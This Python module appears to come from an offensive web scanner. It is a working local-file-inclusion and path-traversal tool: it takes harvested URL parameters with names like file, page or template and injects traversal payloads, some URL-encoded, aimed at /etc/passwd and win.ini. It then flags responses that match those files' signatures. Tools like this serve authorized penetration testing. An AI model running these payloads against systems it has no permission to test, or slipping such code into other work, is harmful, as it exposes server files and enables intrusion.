"""
src/modules/traversal.py — LFI (Local File Inclusion) & Path Traversal Sniper

Strategy:
  1. Retrieve URL parameters harvested by the Spider module.
  2. Filter for parameter names commonly used for file includes (file, page, path, doc, view, template).
  3. Inject path traversal payloads aiming for /etc/passwd and win.ini.
  4. Analyze responses for known file signatures.
"""

from __future__ import annotations

import re
from urllib.parse import urlencode, urlparse, urlunparse, parse_qsl

from rich.panel import Panel
from rich.table import Table
from rich.markup import escape

from src.config import SESSION, console
from src.models import ScanResult

_LFI_PARAMS = {"file", "page", "doc", "dir", "path", "folder", "include", "template", "view", "show", "document", "layout"}

_PAYLOADS = [
    # Linux
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    # Windows
    "../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "C:/windows/win.ini",
]

_SIGNATURES = [
    (re.compile(r"root:.*:0:0:"), "/etc/passwd"),
    (re.compile(r"\[extensions\]|\[fonts\]"), "win.ini"),
]


def _build_url(url: str, param_name: str, payload: str) -> str:
    """Replace param_name in the URL query string with the payload."""
    parsed = urlparse(url)
    qs = parse_qsl(parsed.query)
    # Replace the target param, keep others
    new_qs = []
    for k, v in qs:
        if k == param_name:
            new_qs.append((k, payload))
        else:
            new_qs.append((k, v))
    new_query = urlencode(new_qs)
    return urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
    )


def run_lfi(target_url: str, hostname: str, result: ScanResult, progress, task) -> None:
    """Hunt for LFI / Path Traversal vulnerabilities."""
    progress.update(task, description="[cyan]LFI Sniper:[/cyan] Checking harvested parameters…")

    findings = []
    parameters = getattr(result, "parameters", {})

    target_params = []
    for url, params in parameters.items():
        for p in params:
            if p.lower() in _LFI_PARAMS:
                target_params.append((url, p))

    if not target_params:
        progress.update(task, completed=100)
        return

    total_checks = len(target_params) * len(_PAYLOADS)
    completed_checks = 0

    for url, param in target_params:
        for payload in _PAYLOADS:
            test_url = _build_url(url, param, payload)
            
            completed_checks += 1
            progress.update(
                task, 
                description=f"[cyan]LFI Sniper:[/cyan] {completed_checks}/{total_checks} — Testing {param} parameter…",
                completed=(completed_checks / total_checks) * 100
            )

            try:
                # Use a short timeout, LFI is usually immediate if vulnerable
                r = SESSION.get(test_url, timeout=5, allow_redirects=True)
                
                # Check signatures
                for sig_regex, file_name in _SIGNATURES:
                    if sig_regex.search(r.text):
                        findings.append({
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "file_accessed": file_name,
                            "severity": "critical"
                        })
                        
                        progress.console.print(
                            Panel(
                                f"[bold red]CRITICAL LFI DETECTED![/bold red]\n\n"
                                f"  [bold]Parameter:[/bold] {param}\n"
                                f"  [bold]Payload  :[/bold] {payload}\n"
                                f"  [bold]Target   :[/bold] [cyan]{test_url}[/cyan]\n"
                                f"  [bold]Extracted:[/bold] {file_name}",
                                title="[bold red blink]☠ LFI / PATH TRAVERSAL ☠[/bold red blink]",
                                border_style="red"
                            )
                        )
                        break # Stop testing this URL/param combo if already proven vulnerable

            except Exception:
                pass

    result.lfi_findings = findings
    progress.update(task, completed=100)


def display_lfi(result: ScanResult) -> None:
    findings = getattr(result, "lfi_findings", [])
    if not findings:
        return

    console.print()
    tbl = Table(
        "Parameter", "Payload", "File Accessed", "Target URL",
        title="[bold red]📂 Local File Inclusion (LFI)[/bold red]",
        header_style="bold red",
        border_style="red",
        show_lines=True
    )
    for f in findings:
        tbl.add_row(
            escape(f["parameter"]),
            f"[yellow]{escape(f['payload'])}[/yellow]",
            f"[bold red]{f['file_accessed']}[/bold red]",
            f"[dim]{escape(f['url'])}[/dim]",
        )
    console.print(tbl)
